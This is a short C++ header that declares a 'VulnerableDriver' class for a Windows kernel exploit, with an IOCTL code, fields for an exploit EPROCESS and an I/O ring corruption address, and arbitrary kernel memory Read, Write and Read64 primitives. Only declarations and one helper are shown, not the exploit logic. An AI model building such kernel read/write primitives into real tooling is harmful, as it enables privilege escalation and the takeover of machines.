#pragma once

#include "general.h"

#define IOCTL_GET_FIRST_EPROCESS CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)


class VulnerableDriver {
public:
	bool primitivesEnabled;

	UINT64 exploitEPROCESS;

	UINT64 reusableIORingCorruptionAddr;
	UINT64 reusableIORingOriginalValue;

	HANDLE hDevice;

	void EnablePrimitives();
	void CleanUp();

	void Read(UINT64* iDestinationAddr, UINT64 iTargetAddr, UINT64 iSize);
	void Write(UINT64 iDestinationAddr, UINT64 data);

	UINT64 GetEPROCESS();

	// Read a single UINT64 from a validated kernel address
	inline UINT64 Read64(UINT64 addr) {
		if (!IsValidKernelAddress(addr)) {
			DbgLog("[Read64] SKIP: non-canonical addr=0x%llX\n", addr);
			return 0;
		}
		UINT64 val = 0;
		Read(&val, addr, sizeof(UINT64));
		return val;
	}
};